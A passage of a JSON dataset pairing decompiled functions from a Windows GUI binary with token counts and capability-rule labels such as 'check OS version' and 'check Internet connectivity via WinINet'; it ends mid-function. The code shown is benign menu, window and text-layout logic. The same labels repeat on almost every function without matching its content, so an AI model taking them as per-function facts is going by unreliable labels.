        "decompiled_code": "\nvoid __cdecl fcn.00440313(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    \n    fcn.0042b38f();\n    uVar2 = fcn.0042dd19();\n    piVar3 = in_ECX;\n    if ((uVar2 & 0x40000000) == 0) {\n        piVar3 = fcn.0042bf1b();\n    }\n    if (arg_8h != 0) {\n        arg_ch = in_ECX;\n    }\n    if ((piVar3 == arg_ch) ||\n       ((piVar4 = fcn.0042bf1b(),  piVar3 == piVar4 &&\n        (iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(arg_ch[7], 0x36d, 0x40, 0),  iVar5 != 0)))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    piVar3[0xe] = piVar3[0xe] & 0xffffffdf;\n    if (bVar1) {\n        piVar3[0xe] = piVar3[0xe] | 0x20;\n    }\n    fcn.0043fddc(!bVar1 * '\\x04' + '\\x04');\n    piVar3 = in_ECX[0x2b];\n    if (piVar3 == NULL) {\n        iVar5 = (**(*in_ECX + 0x13c))();\n        piVar3 = *(iVar5 + 0xac);\n        if (piVar3 == NULL) {\n            return;\n        }\n    }\n    if ((arg_8h != 0) && (arg_10h == 0)) {\n        (**(*piVar3 + 0x15c))(1, piVar3, piVar3);\n    }\n    (**(*piVar3 + 0x160))(arg_8h);\n    return;\n}\n",
        "token_count": 487
    },
    "004403e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004403e6(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0042bf1b();\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    param_2 = param_2 & 0xfff0;\n    if (*(iVar2 + 100) == 0) {\ncode_r0x00440422:\n        fcn.0042b38f();\n    }\n    else {\n        if (param_2 < 0xf041) {\n            if (((param_2 != 0xf040) && (param_2 != 0xf000)) && (param_2 != 0xf010)) {\n                iVar2 = param_2 - 0xf020;\ncode_r0x0044041b:\n                if ((iVar2 != 0) && (iVar2 != 0x10)) goto code_r0x00440422;\n            }\n        }\n        else if ((param_2 != 0xf050) && (param_2 != 0xf060)) {\n            iVar2 = param_2 - 0xf120;\n            goto code_r0x0044041b;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0x365, 0, (param_2 - 0xf000 >> 4) + 0x1ef00);\n        if (iVar2 == 0) {\n            (*pcVar1)(*(param_1 + 0x1c), 0x111, 0xe147, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "00440565": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440565(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int16_t iVar5;\n    int32_t in_ECX;\n    uint var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    uVar4 = fcn.00444bf8();\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalGetAtomNameA;\n    iVar1 = *(uVar4 + 4);\n    if ((((iVar1 != 0) && (arg_ch != 0)) && (iVar5 = arg_ch >> 0x10,  iVar5 != 0)) &&\n       ((arg_ch == *(iVar1 + 0x8c) && (iVar5 == *(iVar1 + 0x8e))))) {\n        (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(uVar4 & 0xffff0000 | *(iVar1 + 0x8c), &var_108h, 0x103);\n        pcVar3 = _sym.imp.KERNEL32.dll_GlobalAddAtomA;\n        (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&var_108h);\n        (*pcVar2)(*(iVar1 + 0x8e), &var_108h, 0x103);\n        (*pcVar3)(&var_108h);\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x3e4, *(in_ECX + 0x1c), *(iVar1 + 0x8c));\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 396
    },
    "00440706": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440706(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    piVar1 = fcn.0043fbce();\n    if (arg_10h == 0) {\n        fcn.0042e037(0, 0, 0, 0, 0, (-(arg_ch != 0) & 0xffffffc0) + 0x80 | 0x17);\n        (**(*arg_8h + 0x14c))(arg_ch);\n        if ((arg_ch != 0) || (iVar2 = fcn.0043fbe2(),  iVar2 == 0)) {\n            (**(*piVar1 + 0x144))(0);\n        }\n    }\n    else {\n        (**(*arg_8h + 0x14c))(arg_ch);\n        piVar1[0x33] = piVar1[0x33] | 0xc;\n    }\n    iVar2 = fcn.0043fbe2();\n    if (iVar2 == 0) {\n        return;\n    }\n    if (arg_8h[0x22] == NULL) {\n        uVar3 = arg_ch != 0;\n    }\n    else {\n        uVar3 = (**(*arg_8h[0x22] + 0x168))();\n    }\n    if (uVar3 == 1) {\n        if (arg_ch != 0) {\n            piVar1[0x27] = -1;\n            if (arg_10h == 0) {\n                uVar4 = 8;\n                goto code_r0x004407c9;\n            }\n            piVar1[0x27] = 8;\n            goto code_r0x004407f2;\n        }\n    }\n    else if (uVar3 == 0) {\n        piVar1[0x27] = -1;\n        if (arg_10h != 0) {\n            piVar1[0x27] = 0;\n            return;\n        }\n        uVar4 = 0;\ncode_r0x004407c9:\n        fcn.0042de3e(uVar4);\n        return;\n    }\n    if (arg_10h != 0) {\n        return;\n    }\ncode_r0x004407f2:\n    (**(*piVar1 + 0x144))(0);\n    return;\n}\n",
        "token_count": 562
    },
    "00440802": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440802(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    uint arg_ch_00;\n    int32_t iVar8;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00434c0d(*(in_ECX + 0x1c));\n    if ((arg_10h == 0) &&\n       ((*(in_ECX + 0x7c) == 0 || (iVar2 = (**(**(in_ECX + 0x7c) + 0x74))(arg_8h, arg_ch, 0),  iVar2 == 0)))) {\n        fcn.0042e84a();\n        iVar2 = fcn.00444bc2();\n        pcVar1 = _sym.imp.USER32.dll_GetMenu;\n        if ((*(iVar2 + 0x78) != *(arg_8h + 4)) &&\n           (((iVar2 = (*_sym.imp.USER32.dll_GetMenu)(*(in_ECX + 0x1c)),  iVar2 != 0 &&\n             (iVar2 = fcn.0042c69d(),  iVar2 != 0)) && (iVar2 = (*pcVar1)(*(iVar2 + 0x1c)),  iVar2 != 0)))) {\n            iVar3 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar2);\n            iVar7 = 0;\n            if (0 < iVar3) {\n                do {\n                    iVar8 = iVar7;\n                    iVar4 = (*_sym.imp.USER32.dll_GetSubMenu)(iVar2, iVar7);\n                    if (iVar4 == *(arg_8h + 4)) {\n                        fcn.0042f7d0(iVar8, iVar2);\n                        break;\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < iVar3);\n            }\n        }\n        var_ch = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n        pcVar1 = _sym.imp.USER32.dll_GetMenuItemID;\n        var_24h = 0;\n        if (var_ch != 0) {\n            do {\n                uVar6 = var_24h;\n                var_28h = (*pcVar1)(*(arg_8h + 4), var_24h);\n                uVar5 = var_ch;\n                if (var_28h != 0) {\n                    if (var_28h == 0xffffffff) {\n                        iVar2 = fcn.0040b64a(uVar6, var_24h);\n                        if (((iVar2 == 0) || (var_28h = (*pcVar1)(*(iVar2 + 4), 0),  var_28h == 0)) ||\n                           (var_28h == 0xffffffff)) goto code_r0x00440966;\n                        arg_ch_00 = 0;\n                    }\n                    else if ((*(in_ECX + 0x50) == 0) || (0xefff < var_28h)) {\n                        arg_ch_00 = 0;\n                    }\n                    else {\n                        arg_ch_00 = 1;\n                    }\n                    fcn.0042e870(in_ECX, arg_ch_00);\n                    uVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n                    if (uVar5 < var_ch) {\n                        var_24h = var_24h + (uVar5 - var_ch);\n                        while ((var_24h < uVar5 && (uVar6 = (*pcVar1)(*(arg_8h + 4), var_24h),  uVar6 == var_28h))) {\n                            var_24h = var_24h + 1;\n                        }\n                    }\n                }\ncode_r0x00440966:\n                var_ch = uVar5;\n                var_24h = var_24h + 1;\n            } while (var_24h < var_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 990
    },
    "0044097c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044097c(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    \n    iVar1 = fcn.0042bf1b();\n    if ((in_ECX[0x1f] != NULL) && (iVar2 = (**(*in_ECX[0x1f] + 0x7c))(arg_8h, arg_ch, arg_10h),  iVar2 != 0)) {\n        return;\n    }\n    if (arg_ch == 0xffff) {\n        in_ECX[0xe] = in_ECX[0xe] & 0xffffffbf;\n        if (*(iVar1 + 100) == 0) {\n            in_ECX[0x29] = 0xe001;\n        }\n        else {\n            in_ECX[0x29] = 0xe002;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[7], 0x362, in_ECX[0x29], 0);\n        iVar1 = (**(*in_ECX + 0x150))();\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(*(iVar1 + 0x1c));\n        }\n        goto code_r0x00440a53;\n    }\n    if ((arg_8h == 0) || ((arg_ch & 0x810) != 0)) {\n        in_ECX[0x29] = 0;\n    }\n    else {\n        if ((arg_8h < 0xf000) || (0xf1ef < arg_8h)) {\n            if (0xfeff < arg_8h) {\n                in_ECX[0x29] = 0xef1f;\n                goto code_r0x00440a4f;\n            }\n        }\n        else {\n            arg_8h = (arg_8h - 0xf000 >> 4) + 0xef00;\n        }\n        in_ECX[0x29] = arg_8h;\n    }\ncode_r0x00440a4f:\n    *(iVar1 + 0x38) = *(iVar1 + 0x38) | 0x40;\ncode_r0x00440a53:\n    if (in_ECX[0x29] != in_ECX[0x2a]) {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[7]);\n        iVar1 = fcn.0042b432(uVar3);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_PostMessageA)(in_ECX[7], 0x36a, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 633
    },
    "00440aee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid fcn.00440aee(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    int32_t *unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iStack80;\n    int32_t *var_48h;\n    uint var_44h;\n    uint uStack68;\n    uint var_2ch;\n    uint var_28h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    uStack68 = 10;\n    var_44h = 0x440b08;\n    fcn.0042703b();\n    *(unaff_EBP + -4) = 0;\n    var_44h = 10;\n    var_48h = 0x440b16;\n    fcn.0042703b();\n    iVar1 = *(extraout_ECX + 0x84);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x10) = iVar1;\n    var_48h = unaff_EDI;\n    while (iVar1 != 0) {\n        iStack80 = unaff_EBP + -0x10;\n        ppiVar3 = fcn.0040ab3a();\n        piVar4 = *ppiVar3;\n        (**(*piVar4 + 0x158))();\n        iStack80 = 0x440b55;\n        var_48h = piVar4;\n        fcn.004270e9();\n        iVar1 = *(unaff_EBP + -0x10);\n    }\n    puVar5 = *(unaff_EBP + -0x44);\n    while (puVar5 != NULL) {\n        if (puVar5 == NULL) goto code_r0x00422e61;\n        ppiVar3 = puVar5 + 2;\n        puVar5 = *puVar5;\n        if ((*ppiVar3)[0x24] == 0) {\n            var_48h = 0x440b88;\n            (**(**ppiVar3 + 0x60))();\n        }\n        else {\n            var_48h = 0x440b7a;\n            piVar4 = fcn.0042bedc();\n            var_48h = 0x440b81;\n            (**(*piVar4 + 0x60))();\n        }\n    }\n    puVar5 = *(unaff_EBP + -0x28);\n    while( true ) {\n        if (puVar5 == NULL) {\n            *(unaff_EBP + -4) = 0;\n            var_48h = 0x440bb5;\n            fcn.0042705e();\n            *(unaff_EBP + -4) = 0xffffffff;\n            var_48h = 0x440bc1;\n            fcn.0042705e();\n            *in_FS_OFFSET = *(unaff_EBP + -0xc);\n            return;\n        }\n        if (puVar5 == NULL) break;\n        ppiVar3 = puVar5 + 2;\n        puVar5 = *puVar5;\n        if (*ppiVar3 != NULL) {\n            var_48h = 0x440ba5;\n            (**(**ppiVar3 + 0x60))();\n        }\n    }\ncode_r0x00422e61:\n    iStack80 = 0x4651d0;\n    fcn.00411d3b(&stack0xffffffb0, 0x45d1dc);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 856
    },
    "00440bd3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00440bd3(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else {\n        var_4h = *(in_ECX + 0x84);\n        do {\n            if (var_4h == 0) {\n                return 0;\n            }\n            piVar2 = fcn.0040ab3a(&var_4h);\n            iVar1 = *piVar2;\n            uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(iVar1 + 0x1c));\n        } while ((uVar3 & 0xffff) != arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 207
    },
    "004421b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004421b9(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(2, arg_ch + 1);\n    if (iVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LocalLock)(iVar1);\n        iVar3 = fcn.00434e3d(iVar2, arg_ch);\n        if (iVar3 != arg_ch) {\n            (*_sym.imp.KERNEL32.dll_LocalUnlock)(iVar1);\n            (*_sym.imp.KERNEL32.dll_LocalFree)(iVar1);\n            fcn.0043586f(3, 0);\n        }\n        *(iVar2 + arg_ch) = 0;\n        if (*0x466dfc == 0) goto code_r0x0044225a;\n        iVar2 = (*_sym.imp.USER32.dll_SetWindowTextA)(*(in_ECX + 0x1c), iVar2);\n        (*_sym.imp.KERNEL32.dll_LocalUnlock)(iVar1);\n        (*_sym.imp.KERNEL32.dll_LocalFree)(iVar1);\n        iVar1 = 0;\n        if ((iVar2 != 0) && (iVar2 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(in_ECX + 0x1c)),  arg_ch <= iVar2)) {\n            fcn.0042eae6(*(in_ECX + 0x60));\n            *(in_ECX + 0x60) = 0;\n            *(in_ECX + 100) = 0;\n            return;\n        }\n    }\n    fcn.00422e2d();\ncode_r0x0044225a:\n    (*_sym.imp.KERNEL32.dll_LocalUnlock)(iVar1);\n    uVar4 = fcn.004101c6();\n    (*_sym.imp.KERNEL32.dll_LocalFree)(uVar4);\n    fcn.004101d9(iVar1);\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), 0, 1);\n    return;\n}\n",
        "token_count": 493
    },
    "0044228b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0044228b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint8_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint8_t *lpString;\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint lptm;\n    int32_t var_2ch;\n    uint var_8h;\n    \n    (*_sym.imp.GDI32.dll_GetTextMetricsA)(*(arg_8h + 4), &lptm);\n    lpString = arg_18h + arg_1ch;\n    arg_1ch = arg_18h + arg_20h;\n    iVar3 = 0;\n    puVar4 = lpString;\n    do {\n        if (arg_1ch <= puVar4) break;\n        uVar1 = *puVar4;\n        if (uVar1 == 9) {\n            iVar3 = iVar3 + (arg_14h - iVar3 % arg_14h);\n        }\n        else if ((*0x46703c == 0) || ((*(uVar1 + 0x468721) & 4) == 0)) {\n            iVar3 = iVar3 + *(arg_ch + uVar1 * 4);\n        }\n        else {\n            puVar4 = puVar4 + 1;\n            iVar3 = iVar3 + var_2ch;\n        }\n        puVar4 = puVar4 + 1;\n    } while (iVar3 <= arg_10h);\n    piVar2 = fcn.00410119(&var_8h, lpString, puVar4 - lpString, 1, &arg_14h);\n    if (arg_10h < *piVar2) {\n        do {\n            if (*0x46703c == 0) {\n                puVar4 = puVar4 + -1;\n            }\n            else {\n                puVar4 = fcn.0041306a(lpString, puVar4);\n            }\n            piVar2 = fcn.00410119(&var_8h, lpString, puVar4 - lpString, 1, &arg_14h);\n        } while (*piVar2 != arg_10h && arg_10h <= *piVar2);\n    }\n    else if (*piVar2 < arg_10h) {\n        do {\n            if (arg_1ch <= puVar4) goto code_r0x0044239d;\n            puVar4 = fcn.00412f81(puVar4);\n            piVar2 = fcn.00410119(&var_8h, lpString, puVar4 - lpString, 1, &arg_14h);\n        } while (*piVar2 == arg_10h || *piVar2 < arg_10h);\n        if (*0x46703c == 0) {\n            puVar4 = puVar4 + -1;\n        }\n        else {\n            puVar4 = fcn.0041306a(lpString, puVar4);\n        }\n    }\ncode_r0x0044239d:\n    return puVar4 - arg_18h;\n}\n",
        "token_count": 731
    },
    "004426ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004426ef(void)\n\n{\n    uint uVar1;\n    \n    if (*0x466dfc == 0) {\n        uVar1 = fcn.004101c6();\n        (*_sym.imp.KERNEL32.dll_LocalUnlock)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00442807": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00442807(int32_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint lpBuffer;\n    int32_t lptm;\n    int32_t var_80h;\n    uint var_58h;\n    uint var_50h;\n    int32_t var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    uVar1 = fcn.0042dd19();\n    var_28h = ~(uVar1 >> 7) & 1;\n    uVar1 = fcn.00442705();\n    if (arg_10h < uVar1) {\n        var_4h = fcn.00442675();\n        if (uVar1 < arg_14h) {\n            arg_14h = uVar1;\n        }\n        (*_sym.imp.GDI32.dll_GetTextMetricsA)(arg_8h[2], &lptm);\n        var_ch = var_80h + lptm;\n        piVar2 = fcn.00410119(&var_20h, 0x454c90, 1, 0, 0);\n        var_10h = ((*(in_ECX + 0x5c) * *piVar2) / 8) / 4;\n        (*_sym.imp.GDI32.dll_GetCharWidthA)(arg_8h[2], 0, 0xff, &lpBuffer);\n        uVar1 = arg_ch[1];\n        var_18h = arg_ch[2] - *arg_ch;\n        (**(*arg_8h + 0x1c))();\n        iVar3 = fcn.00432d66(arg_ch);\n        arg_8h = uVar1;\n        do {\n            uVar1 = fcn.004420cd(var_4h, arg_14h, arg_10h);\n            if (arg_10h == uVar1) {\n                arg_8h = arg_8h + var_ch;\n            }\n            else if (var_28h == 0) {\n                var_38h = *arg_ch;\n                var_30h = arg_ch[2];\n                var_34h = arg_8h;\n                var_2ch = arg_8h + var_ch;\n                var_1ch = var_2ch;\n                if ((iVar3 != 1) && (iVar4 = (**(*arg_8h_00 + 0x58))(&var_38h),  iVar4 != 0)) {\n                    uVar5 = fcn.0044228b(arg_8h_00, &lpBuffer, var_18h, var_10h, var_4h, arg_10h, uVar1);\n                    if (uVar5 < uVar1) {\n                        if ((*(*(uVar5 + var_4h) + 0x468721) & 4) != 0) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    (**(*arg_8h_00 + 100))\n                              (&var_50h, var_38h, arg_8h, arg_10h + var_4h, uVar5 - arg_10h, 1, &var_10h, var_38h);\n                }\n                arg_8h = var_1ch;\n            }\n            else {\n                var_14h = arg_8h + var_ch;\n                while( true ) {\n                    var_1ch = fcn.0044228b(arg_8h_00, &lpBuffer, var_18h, var_10h, var_4h, arg_10h, uVar1);\n                    var_8h = var_1ch;\n                    if (var_1ch != uVar1) {\n                        while ((arg_10h < var_8h && (iVar4 = fcn.004137ad(*(var_8h + var_4h)),  iVar4 == 0))) {\n                            var_8h = var_8h - 1;\n                        }\n                        if (var_8h == arg_10h) {\n                            var_8h = var_1ch;\n                        }\n                    }\n                    var_48h = *arg_ch;\n                    var_44h = arg_8h;\n                    var_40h = arg_ch[2];\n                    var_3ch = var_14h;\n                    if ((iVar3 != 1) && (iVar4 = (**(*arg_8h_00 + 0x58))(&var_48h),  iVar4 != 0)) {\n                        (**(*arg_8h_00 + 100))\n                                  (&var_58h, var_48h, arg_8h, arg_10h + var_4h, var_8h - arg_10h, 1, &var_10h, var_48h);\n                    }\n                    arg_8h = arg_8h + var_ch;\n                    var_14h = var_14h + var_ch;\n                    arg_10h = var_8h;\n                    if (uVar1 <= var_8h) break;\n                    do {\n                        iVar4 = fcn.004137ad(*(arg_10h + var_4h));\n                        if (iVar4 == 0) break;\n                        arg_10h = arg_10h + 1;\n                    } while (arg_10h < uVar1);\n                    if ((uVar1 <= arg_10h) || (arg_ch[3] < var_14h)) break;\n                }\n            }\n            uVar1 = fcn.004420ee();\n        } while ((uVar1 < arg_14h) && (arg_10h = uVar1,  arg_8h + var_ch <= arg_ch[3]));\n        (**(*arg_8h_00 + 0x20))(0xffffffff);\n        fcn.004426ef();\n        arg_ch[3] = arg_8h;\n    }\n    return uVar1;\n}\n",
        "token_count": 1545
    },
    "00442caf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lParam\n// WARNING: Variable defined which should be unmapped: wParam\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nbool __cdecl fcn.00442caf(uint lpString, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint wParam;\n    uint lParam;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x1c), 0xb0, unaff_EBP + -0x18, unaff_EBP + -0x14);\n    if (iVar1 == *(unaff_EBP + -0x14) - *(unaff_EBP + -0x18)) {\n        piVar2 = fcn.004290ee();\n        iVar1 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar1 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.00442c45(unaff_EBP + -0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(*(unaff_EBP + 8), *(unaff_EBP + -0x10));\n        }\n        else {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)();\n        }\n        bVar3 = iVar1 == 0;\n        fcn.00401200();\n    }\n    else {\n        bVar3 = false;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar3;\n}\n",
        "token_count": 476
    },
    "00442d52": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: wParam\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: lParam\n\nuint __cdecl fcn.00442d52(uint lpString, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint8_t *puVar10;\n    uint *in_FS_OFFSET;\n    bool bVar11;\n    uint lParam;\n    uint var_24h;\n    uint wParam;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    uVar4 = fcn.00442705();\n    *(unaff_EBP + -0x1c) = uVar4;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x1c), 0xb0, unaff_EBP + -0x20, unaff_EBP + -0x28);\n    uVar7 = *(unaff_EBP + -0x20);\n    iVar6 = (*(unaff_EBP + 0xc) != 0) * 2 + -1;\n    *(unaff_EBP + -0x10) = iVar6;\n    if ((uVar7 != 0) || (-1 < iVar6)) {\n        fcn.00444bf8();\n        